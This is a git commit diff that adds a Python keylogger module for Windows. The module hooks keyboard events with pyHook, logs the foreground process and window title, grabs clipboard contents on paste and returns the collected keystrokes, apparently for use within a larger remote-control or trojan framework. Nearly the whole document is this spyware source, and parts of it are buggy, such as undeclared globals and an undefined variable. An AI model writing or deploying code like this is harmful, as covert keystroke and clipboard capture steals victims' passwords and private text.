57e91e346778662223d748f1715144349f1774b4
Shunto <shu.410.soccer.s@gmail.com>
2017-04-11 06:55:15 -0400

    Adding the keylogger module.

--- modules/keylogger.py
+++ modules/keylogger.py
@@ -10,6 +10,11 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
+
+keylog = ""
+count = 0
+exit_count = 20
+
 def get_current_process():
 
   hwnd = user32.GetForegroundWindow()
@@ -22,4 +27,57 @@ def get_current_process():
   executable = create_string_buffer("\x00" * 512)
   h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
-  psapi.
+  psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
+
+  window_title = create_string_buffer("\x00" * 512)
+  length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
+
+  print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+
+  kernel32.CloseHandle(hwnd)
+  kernel32.CloseHandle(h_process)
+
+
+def KeyStroke(event):
+  global current_window
+
+  if event.WindowName != current_window:
+    current_window = event.WindowName
+    get_current_process()
+
+  if event.Ascii > 32 and event.Ascii < 127:
+    print chr(event.Ascii),
+    keylog += chr(event.Ascii)
+  else:
+    
+    if event.Key == "V":
+      win32clipboard.OpenClipboard()
+      pasted_value = win32clipboard.GetClipboardData()
+      win32clipboard.CloseClipboard()
+
+      print "[PASTE] - %s" % (pasted_value),
+      keylog += pasted_value
+
+    else:
+      print "[%s]" % event.Key,
+      keylog += event.Key
+
+  count+=1
+  if count == exit_count:
+    return False
+
+  return True
+
+def run(**args):
+
+  
+  kl = pyHook.HookManager()
+  kl.KeyDown = KeyStroke
+
+  kl.HookKeyboard()
+  pythoncom.PumpMessages()
+ 
+  return str(keylog) 
+
+if __name__ == "__main__":
+  run()
